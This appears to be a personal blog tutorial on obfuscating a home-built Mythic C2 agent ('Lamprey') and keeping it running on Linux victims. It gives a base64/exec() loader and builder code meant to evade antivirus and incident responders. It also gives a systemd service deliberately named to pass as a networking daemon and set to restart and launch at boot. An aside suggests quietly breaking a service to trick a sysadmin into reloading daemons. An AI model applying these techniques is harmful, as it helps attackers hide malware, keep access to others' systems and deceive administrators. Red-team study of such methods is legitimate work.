# Persistence in a Victim with my Mythic Agent, Lamprey - Linux Edition
## Introduction
I recently developed an agent for the Mythic C2 framework.  I wanted to learn how to effectively use it, so I figured I would play with persistence methods in Linux to stay in a victim, and stay quiet.  
Is my agent the best one out there?  No.  Are there better Python ones?  Absoulutely.  However, I understand Lamprey better then I understand Medusa (or any other agent), which will allow me to have better control of what goes on in the victim.  A tool's utility is directly proportional to your understanding of it. 
Do I have a plan for how this blog post is going to go?  Not really.  I am just going to try different methods and write about them as I go. 

## EDR/AV Evasion
IF you can't execute on a system because of an EDR or AV, it doesn't matter how well you can hide yourself from an IRT.  Let's see what commonly-used EDRs/AVs think of Lamprey:

### Virustotal
The go-to tool to check if a file is malware is virustotal.com.  It's super easy to upload a file and get opinions from a ton of the most well-known AVs out there.  Do they like Lamprey?  Let's upload a sample.  
![virustotal Lamprey](/images/2022/virustotalLamprey.png){:class="img-responsive"}
Surprisingly, despite the use of POST calls and `os.popen()`, that apparently isn't enough to trigger these AVs to label Lamprey as malware.  I see this as an absolute win!
I think we can do a little better though.  

### Evasion is Based
_(Ok, I don't like how kids these days talk either, I'm talking about a different kind of base... I promise)_
Even though Lamprey isn't detected by anything on virustotal, that doesn't mean we can't still make it harder to detect.  Good enough isn't fun when we know how to do better.  Let's use a very interesting Python function to make Lamprey one layer deeper.  That is, `exec()`.  `exec()` executes a string as though it were Python code.  So here's my plan:  Encode a Lampry.py payload into base64, copy that as a string in to a variable in a new Python payload, add another line in that payload that will decode the string from base64 and send it to `exec()`.  This way, even if the `os.popen()` call is flagged by some software on the victim, that string will never be in the file in the first place.  All the decoding is happening in memory, not on the disk.  This also helps evasion against IRTs or nosy users.  (Although, if they know anything about what they're doing, they'll immediately recognise what is going on, so don't put too much faith in this method.)  So, it's all good and fine to do this manually, but we are using the powerful Mythic framework, are we not?  (That was rhetorical, we are using it.)  We can make this base64 encoding an option in the build options section of Lamprey itself.  Then, if that flag is set, in builder.py, we can take the built payload, translate it into base64, and add the decoder.  In fact, all this happens in builder.py.  Let's add that now:

#### Theory is Boring, Let's Code
First, we need the decoder, so we can bring it into the builder.py script.  In the agent_code directory (where base_agent.py is located), create a file called decoder.py.  In it, we will have the code:
```
import base64
encoded = "encoded_code"
exec(base64.b64decode(encoded.encode()))
```
This is a pretty self-explanatory three lines of code.  The only think you will want to make note of, is that the "encoded_code" string (but not the quotation marks) will be replaced with the encoded form of Lamprey.py. 

Now that we have the decoder finished, we need to edit builder.py (in the mythic/agent_functions directory).  The first addition we want to add is the build parameter so the operator can choose if they want it to be base64 encoded or not.  in the build_parameters array, we need to add the following:
```
BuildParameter(
            name="encoding",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose payload encoding",
            choices=["py", "base64"],
            default_value="py"
        ),
```
These gives the metadata to the Mythic UI so it can give the operator the choice betwen a standard py output or the new base64 one.  
Next, we add the code to actually implement the decoder.  In the "build" function, right before it returns the base_code, add the following lines:
```
if self.get_parameter("encoding") == "base64":
            encoded_code = base64.b64encode(base_code.encode())
            decoder_code = open(self.agent_code_path / "decoder.py", "r").read()
            base_code = decoder_code.replace("encoded_code",encoded_code.decode())
```
This checks the "encoding" build parameter that we specified previously to see if "base64" was selected.  If it was, encode the current base_code that is Lamprey.py.  Then, we open decoder.py and store that as a string in decoder_code.  Finally, we replace the "encoded_code" string that I mentioned earlier with encoded_code (the encoded version of Lamprey.py) and assign that to base_code, right before it returns that to Mythic.  

And that's it!  We can build a base64 encoded form of Lamprey! 
Oh man, this think looks evil.
![lamprey base64](/images/2022/lampreyB64.png){:class="img-responsive"}
## Embedding in the System
Our goal in persistence is to invisible and hard to get rid of.  Let's talk about that.  (*insert rooster breathing fire*)

### Services
In Linux, a ton of programs run in the background without users seeing much evidence that they are doing so.  Normally, these are things like webservers, networking managers, and other system-related tasks that the user doesn't care much about the operation of.  These are all run as services.  You might be tempted to think that the best part of services for our purposes is their relative invisibility.  While this is certainly a really useful attribute, it isn't the most beneficial aspect of using services to run Lamprey.  We can make services run at startup.  Yep, that's right, we can embed our malware in the system, so that it doesn't stop when a user inevitably restarts the box.  Combine that with services' relatively invisible nature, and we have a fantastic starting point for persistence.  
A great resource I used to implement Lamprey as a service (can I please call it LaaS?) is [this Medium site.](https://medium.com/codex/setup-a-python-script-as-a-service-through-systemctl-systemd-f0cc55a42267)
Again, theory is only valuable if we implement it.  Let's get to work.  (Note: This won't generate in Mythic, this is a custom systemd service file that you will have to make yourself)

#### Coding Time Again
Make a file in /etc/systemd/system/ called <servicename>.service.  You could call it Lamprey.service, but do you really want to be that blatant?  I think something nicer like networkd-dispatch.service sounds much more "normal" to someone who might not know better.  Anyway, pick a name and make that file.  Then, we can write the following to that file:
```
[Unit]
Description=Networking daemon service dispatcher
After=multi-user.target

[Service]
Type=simple
Restart=always
ExecStart=/usr/bin/python3 <path to>/Lamprey.py

[Install]
WantedBy=multi-user.target
```
This is the most general use-case form of this service.  There are a couple tweaks we could make though for special situations.
 - After: This tells the service to start only afer the multi-user runtime is reached.  If we wanted, we could theoretically have this service run at a lower service level.  I haven't actually tried this, but it should work in theory. 
 - Restart: Right now, restart is set to always.  This means that service will automatically restart when exited (or if it fails).  While this does add another level of persistence, it doesn't allow us to truly exit Lamprey from the Mythic console, as it will keep restarting.  If we are trying to stay hidden, there may be times when we really need Lamprey to die, which Restart=always won't allow. 
 - ExecStart: I left Lamprey.py as the filename as the file to run.  Again, this isn't very hidden.  So, I would change the name of the payload to something more similar to your service name/description.  In my case, I would probably call it networkd-dispatch.py.  

#### Implementation
Once you have Lamprey.py and the service file on the target (you could even use Lamprey to make the file on the victim), we need to implement it.  There are a couple primary steps:
1) Move the service file to /etc/systemd/system/
2) Run `systemctl daemon-reload`.  This lets systemctl know that there is a new service.  Note this will likely require sudo perms.  If you don't have the ability to reload the daemon, you can always wait until the sysadmin does one day.  (Maybe break something subtile in on of the services and try to get the sysadmin to do this for you ;D  Don't be too noisy though.)
3) Run `systemctl enable <service name>`.  This will cause your service to run on startup.  

And there you have it!  A nice persistence mechanism to keep your Mythic agent (or any other payload really) running on a target.

## Conclusion
Evasion and persistence is a very wide topic, and we have only scratched the surface with one method for each. 
If you want to keep researching, here are some ideas I might very well write about in the future:
 - AES encrypt the payload instead of just encoding it.  Lock down your own files so nobody can access them without your permission. This could also be useful for self destruction if a sandbox-detection system is added
 - Take over existing services on a system to run the payload.  Misconfigured permissions and a server running a lot of services would be a prime environment for one hijacked service to get lost in the data.

As always, thanks for reading and I hope you learned something!

